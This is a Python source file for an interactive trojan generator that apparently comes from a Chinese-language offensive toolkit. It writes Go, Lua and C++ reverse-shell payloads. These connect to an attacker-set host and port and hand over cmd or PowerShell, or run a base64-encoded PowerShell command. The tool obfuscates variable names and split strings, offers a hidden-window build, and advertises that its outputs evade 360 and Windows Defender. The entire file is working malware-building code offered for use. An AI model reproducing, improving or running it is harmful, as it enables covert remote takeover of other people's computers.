import os
import sys
import random
import colorama
colorama.init(autoreset=True)

where = ''  # 获取当前属于哪一版块的变量
lhost = ''
lport = ''
string_base64 = ''
output_filename = ''


def Cpp_rePSL(string_):
    # string1, string2
    string_list = list()
    string1 = ''
    string2 = ''

    first_string_len = random.randint(1, 4)
    for i in string_:
        string_list.append(i)

    for c in string_list[0:first_string_len]:
        string1 = string1 + c

    for c in string_list[first_string_len::]:
        string2 = string2 + c

    fill_fun_1 = random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn")
    fill_fun_2 = random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn")
    fill_fun_3 = random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn")
    fill_fun_4 = random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn")
    fill_fun_5 = random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn")
    '''
    随机函数返回类型
    '''
    re_n = random.randint(1,65535)
    
    model_cpp_repsl = '''
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
using std::string;
int {0}()'''.format(fill_fun_1) + "{"+'''
    string {2} = "PoWeRSheLl.exe -";
    string {3} = "e {0} {1}";
    string {4} = {2}+{3};
    system({4}.c_str());
    return 0;'''.format(string1, string2, fill_fun_2, fill_fun_3, fill_fun_4) + '''
}''' + '''
int {0}()'''.format(fill_fun_5) + '''
{''' + '''
{0}();
return {1};
'''.format(fill_fun_1,re_n) + '''
}
''' + '''
int '''+ '''main(){
    ''' + '''{0}'''.format(fill_fun_5) + '''();
    return 0;
}
'''
    return model_cpp_repsl


def GO_build_exe_FUN(filename):
    '''
    用于生成go木马的exe
    '''
    os.system('go build ' + filename)


def GO_build_exe_FUN_hidden(filename):
    '''
        用于生成go木马的exe
        '''
    os.system('go build -ldflags "-s -w -H=windowsgui" ' + filename)


def MODEL_lua_recmd(IP, PORT):
    fill_number_0 = random.randint(1, 100)
    fill_number_1 = random.randint(1, 100)
    fill_number_2 = random.randint(1, 100)
    fill_number_3 = random.randint(1, 100)
    fill_number_4 = random.randint(1, 100)
    fill_number_5 = random.randint(1, 100)
    fill_number_6 = random.randint(1, 100)
    fill_number_7 = random.randint(1, 100)
    model_lua_recmd = '''local host{3}, port{4} = "{0}", {1} local socket = require("socket") local tcp{5} = socket.tcp() local io{6} = require("io") tcp{5}:connect(host{3}, port{4}); while true do local cmd, status, partial = tcp{5}:receive() local f{8} = io{6}.popen(cmd, "r") local s{7} = f{8}:read("*a") f{8}:close() tcp{5}:send(s{7}) if status == "closed" then break end end tcp{5}:close()'''.format(
        IP, PORT, fill_number_0, fill_number_1, fill_number_2, fill_number_3, fill_number_4, fill_number_5,
        fill_number_6, fill_number_7)
    return model_lua_recmd


def MODEL_go_repsl(IP, PORT):
    '''
    生成模板参数
    变量混淆的方式
    '''
    fill_char_1 = random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn")
    fill_char_2 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_3 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_4 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_5 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_6 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_7 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_8 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_9 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_10 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_11 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    # fill_char_2 = random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')
    model_go_rePSL = r'''
package main
import"os/exec"
import"net"
func main(){
''' + '''
    mvdasd()
''' + "}" + '''
func mvdasd(){''' + '''
    {0} := "T";{1} := "cP"
    {2} := "{11}"
    {3} := ":"
    {4} := "{12}"
    {5} := {3}+{4}
    {6} := "P"
    {7}:= "oWE"
    {8} := "RshEll"
    {9},_:=net.Dial({0}+{1},{2}+{5});
    {10}:=exec.Command({6}+{7}+{8})
    {10}.Stdin={9}
    {10}.Stdout={9}
    {10}.Stderr={9}
    {10}.Run()
    '''.format(fill_char_1, fill_char_2, fill_char_3, fill_char_4, fill_char_5, fill_char_6, fill_char_7, fill_char_8,
               fill_char_9, fill_char_10, fill_char_11, IP, PORT) + '''
}
'''
    return model_go_rePSL


def MODEL_go_recmd(IP, PORT):
    '''
    生成模板参数
    变量混淆的方式
    '''
    fill_char_1 = random.choice("abcdefghijklmn") + random.choice("abcdefghijklmn") + random.choice(
        "abcdefghijklmn") + random.choice("abcdefghijklmn")
    fill_char_2 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_3 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_4 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_5 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_6 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_7 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_8 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_9 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_10 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    fill_char_11 = random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba') + random.choice(
        'zyxwvutsrqponmlkjihgfedcba') + random.choice('zyxwvutsrqponmlkjihgfedcba')
    # fill_char_2 = random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')+random.choice('zyxwvutsrqponmlkjihgfedcba')
    model_go_reCMD = r'''
package main
import("os/exec"
    "net"
    "fmt")
func main(){
''' + '''
    maina()
    fmt.Print("{2}{4}{3}")
}
func maina(){
    mvdvx()
}
''' + '''
func mvdvx(){''' + '''
    {0}aaaaaaaaaaaaaaaaaaaaaaaaa := "t";{1}aaaaaaaaaaaaaaaaaaaaaaaaa := "cp"
    {2}aaaaaaaaaaaaaaaaaaaaaaaaa := "{11}"
    {3}aaaaaaaaaaaaaaaaaaaaaaaaa := ":"
    {4}aaaaaaaaaaaaaaaaaaaaaaaaa := "{12}"
    {5}aaaaaaaaaaaaaaaaaaaaaaaaa := {3}aaaaaaaaaaaaaaaaaaaaaaaaa+{4}aaaaaaaaaaaaaaaaaaaaaaaaa
    {6}aaaaaaaaaaaaaaaaaaaaaaaaa := "C"
    {7}aaaaaaaaaaaaaaaaaaaaaaaaa:= "M"
    {8}aaaaaaaaaaaaaaaaaaaaaaaaa := "d"
    {9}aaaaaaaaaaaaaaaaaaaaaaaaa,_:=net.Dial({0}aaaaaaaaaaaaaaaaaaaaaaaaa+{1}aaaaaaaaaaaaaaaaaaaaaaaaa,{2}aaaaaaaaaaaaaaaaaaaaaaaaa+{5}aaaaaaaaaaaaaaaaaaaaaaaaa);
    {10}aaaaaaaaaaaaaaaaaaaaaaaaaaa:=exec.Command({6}aaaaaaaaaaaaaaaaaaaaaaaaa+{7}aaaaaaaaaaaaaaaaaaaaaaaaa+{8}aaaaaaaaaaaaaaaaaaaaaaaaa)
    {10}aaaaaaaaaaaaaaaaaaaaaaaaaaa.Stdin={9}aaaaaaaaaaaaaaaaaaaaaaaaa
    {10}aaaaaaaaaaaaaaaaaaaaaaaaaaa.Stdout={9}aaaaaaaaaaaaaaaaaaaaaaaaa
    {10}aaaaaaaaaaaaaaaaaaaaaaaaaaa.Stderr={9}aaaaaaaaaaaaaaaaaaaaaaaaa
    {10}aaaaaaaaaaaaaaaaaaaaaaaaaaa.Run()
    '''.format(fill_char_1, fill_char_2, fill_char_3, fill_char_4, fill_char_5, fill_char_6, fill_char_7, fill_char_8,
               fill_char_9, fill_char_10, fill_char_11, IP, PORT) + '''
}

'''
    return model_go_reCMD


def main():
    print(colorama.Fore.MAGENTA+
    r"|_________________    "+colorama.Fore.LIGHTGREEN_EX+"|团队:liusuxy       |更新日志:"+colorama.Fore.MAGENTA+\
    "\n|XY-AASTolls-v1.7.1   "+colorama.Fore.LIGHTGREEN_EX+"|版本:v0.1.7(Dev)   |1.使用colorama"+colorama.Fore.MAGENTA+\
    "\n|##--|~~~>~···>    "+colorama.Fore.LIGHTGREEN_EX+"   |成员:liusuxy       "+colorama.Fore.MAGENTA+\
    "\n|_/ ......))]         "+colorama.Fore.LIGHTGREEN_EX+"|当前环境:Python 3.X"
    )
    global where, lport, lhost, output_filename, string_base64
    colorama.init(autoreset=True)
    while True:
        colorama.init(autoreset=True)
        Entry = str(input("XY-msT-B*>"))
        Entry_list = Entry.split(" ")  # 以空格为符号，将输入放入列表
        Entry_kind = Entry_list[0]  # 获取输入命令的是哪一版块的
        '''
        检测输入板块
        '''
        if Entry_kind == 'list':
            print(colorama.Fore.RED+'''\
编号 编写语言 功能         生成文件格式  状态        运行环境            稳定性                   性能               '''+colorama.Fore.GREEN+'''
(1  golang 反弹cmd       生成.exe     已开通(+)  Golang最新版(必要)   十分稳定(不隐藏窗口)        已过360,WindowsDEF
(2  golang 反弹psl       生成.exe     已开通(+)  Golang最新版(必要)   十分稳定(不隐藏窗口)        已过360,WindowsDEF
(3  ruby   上线msf       生成.rb      未开通     ruby最新版(必要)     十分稳定                  已过360,WindowsDEF
(4  ruby   反弹cmd       生成.rb      未开通     ruby最新版(必要)     十分稳定                  已过360,WindowsDEF
(5  Python 上线msf       生成.py      未开通     Python3最新版(必要)  十分稳定                  已过360,WindowsDEF
(6  Python 反弹shell     生成.py      未开通     Python3最新版(必要)  较为稳定                  已过360,WindowsDEF
(7  Python 远程Ps1 CMD   生成.exe     未开通     Python3最新版(必要)  较为稳定                  已过WindowsDEF
(8  Python 远程Shellcode 生成.exe     未开通     Python3最新版(必要)  较为稳定                  已过360,WindowsDEF
(9  C++    上线Bs64PslCMd生成.cpp     已开通(+)  Gcc/VC最新版        较为稳定                  已过WindowsDEF
(10 Lua    反弹cmd       生成.lua     已开通(+)  Lua最新版(可选)      十分稳定                  已过360,WindowsDEFl
            ''')
        elif Entry_kind == 'into':
            '''
            into 函数,切换板块
            '''
            if Entry_list[1] == '1':
                # 初始化lhost,lport
                global where
                lhost = ''
                lport = ''
                where = '1'
                print(colorama.Fore.BLUE+"[*]into 1")

            elif Entry_list[1] == '2':
                # 初始化lhost,lport
                lhost = ''
                lport = ''
                # 进入板块
                where = '2'
                print(colorama.Fore.BLUE+"[*]into 2")
            elif Entry_list[1] == '9':
                # 初始化lhost,lpor
                lhost = ''
                lport = ''
                # 进入板块
                where = '9'
                print(colorama.Fore.BLUE+"[*]into 9")

            elif Entry_list[1] == '10':
                # 初始化lhost,lport
                lhost = ''
                lport = ''
                # 进入板块
                where = '10'
                print(colorama.Fore.BLUE+"[*]into 9")
            else:
                print(colorama.Fore.LIGHTRED_EX+'''[Error Grammar] into: into 已开通的编号''')
        elif Entry_kind == 'set':
            '''
            当板块为set时
            '''
            if where == '1':

                if Entry_list[1]:
                    if Entry_list[1] == 'lhost' or Entry_list[1] == 'LHOST':
                        try:
                            lhost = Entry_list[2]
                            print(colorama.Fore.BLUE+"[*]"+colorama.Fore.LIGHTYELLOW_EX+"LHOSt=>"+ colorama.Fore.WHITE+Entry_list[2])
                        except:
                            print(colorama.Fore.LIGHTRED_EX+"[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")

                    elif Entry_list[1] == 'lport' or Entry_list[1] == 'LPORT':
                        try:
                            lport = Entry_list[2]
                            print(colorama.Fore.BLUE + "[*]" + colorama.Fore.LIGHTYELLOW_EX + "LPORT=>" + colorama.Fore.WHITE+Entry_list[2])
                        except:
                            print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                    elif Entry_list[1] == 'output':
                        try:
                            output_filename = Entry_list[2]
                            print(colorama.Fore.BLUE+"[*]"+colorama.Fore.LIGHTYELLOW_EX+"output=>" + Entry_list[2])
                        except:
                            print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")

                    else:
                        print("[Error Grammar]set(设置):set lhost/lport/output XXX")
                else:
                    print("[Error Grammar]set(设置):set lhost/lport/output XXX")

            if where == '2':
                if Entry_list[1]:
                    if Entry_list[1] == 'lhost' or Entry_list[1] == 'LHOST':
                        try:
                            lhost = Entry_list[2]
                            print(colorama.Fore.BLUE+"[*]"+colorama.Fore.LIGHTYELLOW_EX+"LHOSt=>"+ colorama.Fore.WHITE+Entry_list[2])
                        except:
                            print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                    elif Entry_list[1] == 'lport' or Entry_list[1] == 'LPORT':
                        try:
                            lport = Entry_list[2]
                            print(colorama.Fore.BLUE + "[*]" + colorama.Fore.LIGHTYELLOW_EX + "LPORT=>" + colorama.Fore.WHITE+Entry_list[2])
                        except:
                            print(
                                colorama.Fore.LIGHTRED_EX + r"[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                    elif Entry_list[1] == 'output':
                        try:
                            output_filename = Entry_list[2]
                            print(colorama.Fore.BLUE+"[*]"+colorama.Fore.LIGHTYELLOW_EX+"output=>" + Entry_list[2])
                        except:
                            print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")

                    else:
                        print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")

                else:
                    print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")

            if where == '9':
                if Entry_list[1] == 'Bstring' or Entry_list[1] == 'Bstr':
                    try:
                        string_base64 = Entry_list[2]
                        print("[*]Base64-String=>" + Entry_list[2])
                    except:
                        print(colorama.Fore.LIGHTRED_EX+"[Error Grammar]set(设置):set Bstring XXX")
                elif Entry_list[1] == 'output':
                        try:
                            output_filename = Entry_list[2]
                            print(colorama.Fore.BLUE+"[*]"+colorama.Fore.LIGHTYELLOW_EX+"output=>" + Entry_list[2])
                        except:
                            print(
                                colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                else:
                    print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
            if where == '10':

                if Entry_list[1]:
                    if Entry_list[1] == 'lhost' or Entry_list[1] == 'LHOST':
                        try:
                            lhost = Entry_list[2]
                            print(colorama.Fore.BLUE+"[*]"+colorama.Fore.LIGHTYELLOW_EX+"LHOSt=>"+ colorama.Fore.WHITE+Entry_list[2])
                        except:
                            print(
                                colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                    elif Entry_list[1] == 'lport' or Entry_list[1] == 'LPORT':
                        try:
                            lport = Entry_list[2]
                            print(colorama.Fore.BLUE + "[*]" + colorama.Fore.LIGHTYELLOW_EX + "LPORT=>" + colorama.Fore.WHITE+Entry_list[2])
                        except:
                            print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                    elif Entry_list[1] == 'output':
                        try:
                            output_filename = Entry_list[2]
                            print(colorama.Fore.BLUE+"[*]"+colorama.Fore.LIGHTYELLOW_EX+"output=>" + Entry_list[2])
                        except:
                            print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                    else:
                        print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")
                else:
                    print(colorama.Fore.LIGHTRED_EX + "[Error Grammar]set(设置):set lhost/lport/output XXX(当为output时带后缀名)")



            else:
                pass
        elif Entry_kind == 'show':
            # global string_base64
            if where == '1':
                print(colorama.Fore.CYAN+"编号:", colorama.Fore.YELLOW+where)
                print(colorama.Fore.CYAN+"lhost(控制端IP):", colorama.Fore.YELLOW+lhost)
                print(colorama.Fore.CYAN+"lport(控制端PORT):",  colorama.Fore.YELLOW+lport)
                print(colorama.Fore.CYAN+"output(输出文件.go):",  colorama.Fore.YELLOW+output_filename)
            elif where == '2':
                print(colorama.Fore.CYAN+"编号:", colorama.Fore.YELLOW+where)
                print(colorama.Fore.CYAN+"lhost(控制端IP):", colorama.Fore.YELLOW+lhost)
                print(colorama.Fore.CYAN+"lport(控制端PORT):",  colorama.Fore.YELLOW+lport)
                print(colorama.Fore.CYAN+"output(输出文件.go):",  colorama.Fore.YELLOW+output_filename)
            elif where == '9':

                print("|-->编号:", where)
                print("|1. Bstring(Base64的代码):", string_base64)
                print("|2. output(输出文件.cpp):", output_filename)
            elif where == '10':
                print(colorama.Fore.CYAN+"编号:", colorama.Fore.YELLOW+where)
                print(colorama.Fore.CYAN+"lhost(控制端IP):", colorama.Fore.YELLOW+lhost)
                print(colorama.Fore.CYAN+"lport(控制端PORT):",  colorama.Fore.YELLOW+lport)
                print(colorama.Fore.CYAN+"output(输出文件.go):",  colorama.Fore.YELLOW+output_filename)
            else:
                print(colorama.Fore.LIGHTYELLOW_EX+"[!]"+colorama.Fore.RED+"请先into进入编号吧")

        elif Entry_kind == 'where':
            print(colorama.Fore.LIGHTMAGENTA_EX+'IN->' + where)

        elif Entry_kind == 'os->':
            os_cmd = ''
            for i in Entry_list[1::]:
                os_cmd = os_cmd + i + " "
            os.system(r"{0}".format(os_cmd))

        elif Entry_kind == 'generate':
            '''
            检查配置参数是否正常
            '''
            if where == '1':
                if lhost:
                    if lport:
                        if output_filename:
                            print(colorama.Fore.BLUE+"[*]"+"参数设置正常")
                            print(colorama.Fore.BLUE+"[*]"+"开始生成")
                            with open(output_filename, 'w') as write_app:
                                write_model = MODEL_go_recmd(lhost, lport)
                                write_app.write(write_model)
                            print(colorama.Fore.BLUE+"[*]"+"生成源文件完毕")
                            print(colorama.Fore.BLUE+"[*]"+"开始制作exe")
                            GO_build_exe_FUN(output_filename)
                            print(colorama.Fore.BLUE+"[*]"+"制作exe完毕")
                        else:
                            print(colorama.Fore.RED+"[-]"+"参数配置")
                    else:
                        print(colorama.Fore.RED+"[-]"+"参数配置")
                else:
                    print(colorama.Fore.RED+"[-]"+"参数配置")
            elif where == '2':
                if lhost:
                    if lport:
                        if output_filename:
                            print(colorama.Fore.BLUE + "[*]" + "参数设置正常")
                            print(colorama.Fore.BLUE + "[*]" + "开始生成")
                            with open(output_filename, 'w') as write_app:
                                write_model = MODEL_go_repsl(lhost, lport)
                                write_app.write(write_model)
                            print(colorama.Fore.BLUE + "[*]" + "生成源文件完毕")
                            print(colorama.Fore.BLUE + "[*]" + "开始制作exe")
                            GO_build_exe_FUN(output_filename)
                        else:
                            print(colorama.Fore.RED+"[-]"+"参数配置")
                    else:
                        print(colorama.Fore.RED+"[-]"+"参数配置")
                else:
                    print(colorama.Fore.RED+"[-]"+"参数配置")
            elif where == '9':
                if string_base64:
                    if output_filename:
                        print(colorama.Fore.BLUE + "[*]" + "参数设置正常")
                        print(colorama.Fore.BLUE + "[*]" + "开始生成")
                        with open(output_filename , 'w')  as write_demo:
                            write_model = Cpp_rePSL(string_base64)
                            write_demo.write(write_model)
                            write_demo.close()
                        print(colorama.Fore.BLUE + "[*]" + "生成源文件完毕")
                    else:
                        print(colorama.Fore.RED+"[-]"+"参数配置")
                else:
                    print(colorama.Fore.RED+"[-]"+"参数配置")

            elif where == '10':
                if lhost:
                    if lport:
                        if output_filename:
                            print(colorama.Fore.BLUE + "[*]" + "参数设置正常")
                            print(colorama.Fore.BLUE + "[*]" + "开始生成")
                            with open(output_filename, 'w') as write_app:
                                write_model = MODEL_lua_recmd(lhost, lport)
                                write_app.write(write_model)
                            print(colorama.Fore.BLUE + "[*]" + "生成源文件完毕")
                        else:
                            print(colorama.Fore.RED+"[-]"+"参数配置")
                    else:
                        print(colorama.Fore.RED+"[-]"+"参数配置")
                else:
                    print(colorama.Fore.RED+"[-]"+"参数配置")
            else:
                print(colorama.Fore.RED+"[Error Grammar]generate:generate 自动生成")
        else:
            if Entry == "":
                pass
            elif Entry == "exit":
                sys.exit(0)
            else:
                print(colorama.Fore.RED+"[-]"+colorama.Fore.WHITE+Entry+colorama.Fore.LIGHTRED_EX+"not found!")

if __name__ == '__main__':

    main()
